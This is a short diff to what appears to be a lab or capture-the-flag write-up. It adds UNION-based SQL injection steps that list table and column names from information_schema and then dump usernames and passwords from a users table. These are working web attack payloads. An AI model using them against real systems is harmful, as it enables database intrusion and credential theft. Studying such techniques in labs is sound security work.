@@ -26,6 +26,10 @@
 
 2. Retrieve database name: `' UNION SELECT NULL, database(), NULL, NULL, NULL %23`
 
-3. 
+3. Retrieve tables names: `' UNION SELECT NULL, table_name, NULL, NULL, NULL from information_schema.tables %23`
+
+4. Dumping columns from users table: ` UNION SELECT NULL, column_name, NULL, NULL, NULL from information_schema.columns where table_name = "users" %23`
+
+5. Dumping users table: `' UNION SELECT NULL, username, password, NULL, NULL from users %23`
 
 
